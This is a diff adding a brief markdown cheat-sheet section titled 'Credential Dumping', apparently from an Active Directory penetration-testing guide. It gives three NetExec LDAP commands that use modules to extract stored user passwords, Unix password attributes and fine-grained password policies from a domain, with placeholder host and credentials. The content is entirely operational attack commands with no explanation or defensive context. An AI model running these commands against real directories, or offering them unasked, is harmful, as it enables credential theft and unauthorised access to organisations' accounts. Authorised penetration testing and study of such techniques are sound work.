@@ -1,0 +1,13 @@
+# PHASE 5: CREDENTIAL DUMPING
+
+## 👤 User Passwords
+
+nxc ldap <IP> -u user -p pass -M get-userPassword
+
+## 🐧 Unix Passwords
+
+nxc ldap <IP> -u user -p pass -M get-unixUserPassword
+
+## ⚙️ Password Policies (PSO)
+
+nxc ldap <IP> -u admin -p pass -M pso
